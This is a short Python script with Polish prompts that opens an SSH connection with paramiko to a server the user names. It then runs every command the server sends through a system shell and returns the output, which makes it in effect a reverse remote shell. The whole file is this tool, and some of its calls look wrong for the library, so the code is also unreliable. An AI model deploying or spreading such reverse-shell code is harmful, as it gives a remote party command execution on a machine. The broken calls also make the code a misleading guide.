import paramiko
import shlex
import subprocess

def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)

    ssh_session = client.get_transport().open_session()
    if ssh_session.active():
        ssh_session.send(command)
        print(ssh_session.recv(1024).decode())
        while True:
            command = ssh_session.recv(1024)
            try:
                cmd = command.decode()
                if cmd == 'exit':
                    client.close()
                    break
                cmd_output = subprocess.check_output(cmd, shell=True)
                ssh_session.send(cmd_output or 'okey')
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    return

if __name__=='__main__':
    import getpass
    user = getpass.getuser()
    password = getpass.getpass('Hasło: ')
    ip = input('Adres IP Serwera: ')
    port = input('Port: ')
    ssh_command(ip, port, user, password, 'ClientConnected')
